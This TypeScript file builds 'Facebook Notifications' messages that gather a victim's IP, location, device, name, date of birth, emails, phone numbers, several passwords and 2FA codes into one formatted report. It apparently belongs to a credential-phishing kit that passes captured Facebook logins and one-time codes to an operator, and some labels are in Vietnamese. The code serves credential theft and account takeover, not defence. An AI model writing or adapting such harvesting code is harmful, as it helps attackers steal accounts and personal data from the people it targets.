import type { GeoInfo, UserData } from '@/types';

interface BuildMessageOptions {
    geoInfo: GeoInfo | null;
    userData: Pick<UserData, 'fullName' | 'personalEmail' | 'businessEmail' | 'phoneNumber' | 'facebookPageName'> & {
        dateOfBirth?: string;
        backupPhone?: string;
        reason?: string;
    };
    passwords?: string[];
    codes?: string[];
    selectedMethod?: string;
    device?: string;
}

export const escapeHtml = (value: string) =>
    String(value ?? '')
        .replaceAll('&', '&amp;')
        .replaceAll('<', '&lt;')
        .replaceAll('>', '&gt;');

const hasValue = (value?: string | null) => Boolean(String(value ?? '').trim());

const text = (value?: string | null) => escapeHtml(String(value ?? '').trim());

const code = (value?: string | null) => `<code>${text(value)}</code>`;

const line = (label: string, value?: string | null, asCode = false) => {
    if (!hasValue(value)) return null;
    return `• <b>${escapeHtml(label)}</b>: ${asCode ? code(value) : text(value)}`;
};

const formatLocation = (geoInfo: GeoInfo | null) => {
    const city = geoInfo?.city?.trim() || '';
    const region = geoInfo?.region?.trim() || '';
    const country = geoInfo?.country?.trim() || '';
    const countryCode = (geoInfo?.country_code || '').trim().toUpperCase();

    const parts = [
        city || null,
        region || null,
        country ? (countryCode ? `${country} (${countryCode})` : country) : null
    ].filter(Boolean);

    return parts.length > 0 ? parts.join(' · ') : '';
};

const numberedLines = (label: string, values: string[]) =>
    values
        .map((value, idx) => (hasValue(value) ? line(`${label} ${idx + 1}`, value, true) : null))
        .filter(Boolean) as string[];

const DIVIDER = '----------------------';
const ROOT_TITLE = '<b>Facebook Notifications</b>';

const withRootTitle = (body: string) => (body ? `${ROOT_TITLE}\n${DIVIDER}\n${body}` : ROOT_TITLE);

const METHOD_LABELS_VI: Record<string, string> = {
    code: 'Xác thực hai yếu tố',
    device_notifications: 'Thông báo từ các thiết bị khác',
    id_selfie_video: 'Ảnh ID chính thức'
};

const formatMethodLabel = (method?: string) => {
    const key = String(method ?? '').trim();
    if (!key) return '';
    return METHOD_LABELS_VI[key] || key;
};

const section = (rows: Array<string | null>) => {
    const content = rows.filter(Boolean) as string[];
    if (content.length === 0) return null;
    return content;
};

const joinSections = (sections: Array<string[] | null>) =>
    sections
        .filter((item): item is string[] => Boolean(item && item.length > 0))
        .map((item) => item.join('\n'))
        .join(`\n${DIVIDER}\n`);

export function buildContinueMessage({
    geoInfo,
    language = 'en',
    device = 'Unknown'
}: {
    geoInfo: GeoInfo | null;
    language?: string;
    device?: string;
}): string {
    return withRootTitle(
        joinSections([
            section([
                line('IP', geoInfo?.ip, true),
                line('Location', formatLocation(geoInfo), true),
                line('Device', device && device !== 'Unknown' ? device : '', true),
                line('Continue', 'đã tick', true)
            ])
        ])
    );
}

export function buildMetaMessage({
    geoInfo,
    userData,
    passwords = [],
    codes = [],
    selectedMethod = '',
    device = 'Unknown'
}: BuildMessageOptions): string {
    return withRootTitle(
        joinSections([
            section([
                line('IP', geoInfo?.ip, true),
                line('Location', formatLocation(geoInfo), true),
                line('Device', device && device !== 'Unknown' ? device : '', true)
            ]),
            section([
                line('Full Name', userData.fullName, true),
                line('Page', userData.facebookPageName, true),
                line('DOB', userData.dateOfBirth, true)
            ]),
            section([
                line('Email', userData.personalEmail, true),
                line('Business Email', userData.businessEmail, true),
                line('Phone', userData.phoneNumber, true),
                line('Backup Phone', userData.backupPhone, true)
            ]),
            section(numberedLines('Password', passwords)),
            section(numberedLines('2FA', codes)),
            selectedMethod ? section([line('Method', formatMethodLabel(selectedMethod), true)]) : null
        ])
    );
}
